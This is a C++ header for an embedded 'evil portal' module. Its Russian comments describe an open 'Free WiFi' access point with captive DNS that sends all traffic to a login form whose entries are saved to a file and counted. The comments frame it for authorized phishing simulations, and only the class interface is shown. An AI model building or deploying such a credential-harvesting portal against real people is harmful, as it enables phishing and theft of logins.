// ============================================================================
//  EvilPortalModule.h — Captive-портал (для авторизованных фишинг-симуляций)
//
//  Поднимает открытую точку доступа + captive DNS (перехват всех запросов на
//  страницу-портал) + веб-форму. Введённые на форме данные пишутся в файл и
//  считаются. Применять только в рамках согласованного теста.
// ============================================================================
#pragma once
#include <Arduino.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "core/Module.h"

class EvilPortalModule : public IModule {
public:
    const char* name() const override { return "Portal"; }
    bool init() override;
    void update(uint32_t now) override;

    static EvilPortalModule& instance() { return *_self; }

    void start(const String& ssid = "Free WiFi");
    void stop();
    bool active() const { return _active; }
    String ssid() const { return _ssid; }
    int captured() const { return _captured; }

private:
    static EvilPortalModule* _self;
    DNSServer _dns;
    WebServer _server{80};
    bool   _active = false;
    String _ssid;
    int    _captured = 0;

    void handlePortal();
    void handleLogin();
};
